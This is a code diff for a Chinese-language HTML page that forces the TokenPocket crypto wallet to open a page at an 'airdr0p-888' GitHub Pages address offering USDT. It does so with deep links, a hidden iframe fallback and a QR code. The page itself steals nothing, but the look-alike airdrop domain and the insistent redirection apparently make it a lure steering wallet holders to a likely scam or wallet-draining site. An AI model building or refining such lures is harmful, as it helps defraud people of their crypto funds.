@@ -1,6 +1,78 @@
-<a href="tp://openDapp?url=https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html&callback=https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html" 
-   style="text-decoration:none;">
-  <button style="padding:15px 30px; font-size:18px; background:#00A3FF; color:white; border:none; border-radius:8px; cursor:pointer;">
-    打开 TP 钱包（内置浏览器）
-  </button>
-</a>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>唤醒 TP 钱包打开网页</title>
+</head>
+<body>
+
+<button onclick="openTPWallet()" style="padding:15px 30px; font-size:18px; background:#00A3FF; color:white; border:none; border-radius:8px; cursor:pointer;">
+  在 TP 钱包中打开我的页面
+</button>
+
+<div id="qrcode" style="margin-top:20px; display:none; text-align:center;">
+  <p>如果唤醒失败，请用 TP 钱包扫码打开：</p>
+  <img id="qrcode-img" src="" alt="二维码" style="width:200px; border:1px solid #ccc;">
+</div>
+
+<script>
+const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";
+
+function isTPBrowser() {
+  const ua = navigator.userAgent.toLowerCase();
+  return ua.indexOf('tokenpocket') !== -1 || ua.indexOf('tpdapp') !== -1;
+}
+
+function showQRCode(url) {
+  const qr = document.getElementById('qrcode');
+  const img = document.getElementById('qrcode-img');
+  if (!qr || !img) return;
+  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
+  qr.style.display = 'block';
+}
+
+function openTPWallet() {
+  const encodedUrl = encodeURIComponent(TARGET_URL);
+  const encodedCallback = encodeURIComponent(TARGET_URL); // 用目标 URL 作为回调
+  const schemes = [
+    `tp://openDapp?url=${encodedUrl}&callback=${encodedCallback}`,      // 主协议
+    `tpdapp://openDapp?url=${encodedUrl}&callback=${encodedCallback}`  // 备用协议
+  ];
+
+  // 如果已在 TP 浏览器，直接跳转
+  if (isTPBrowser()) {
+    location.href = TARGET_URL;
+    return;
+  }
+
+  // 1. 直接跳转主协议
+  window.location.href = schemes[0];
+
+  // 2. 300ms 后用 iframe 增强（iOS 兼容）
+  setTimeout(() => {
+    try {
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = schemes[0];
+      document.body.appendChild(iframe);
+      setTimeout(() => document.body.removeChild(iframe), 2000);
+    } catch (e) {
+      console.log('Iframe fallback failed:', e);
+    }
+  }, 300);
+
+  // 3. 2秒后尝试备用协议
+  setTimeout(() => {
+    window.location.href = schemes[1];
+  }, 2000);
+
+  // 4. 3.5秒后显示二维码（最终兜底）
+  setTimeout(() => {
+    showQRCode(TARGET_URL);
+  }, 3500);
+}
+</script>
+
+</body>
+</html>
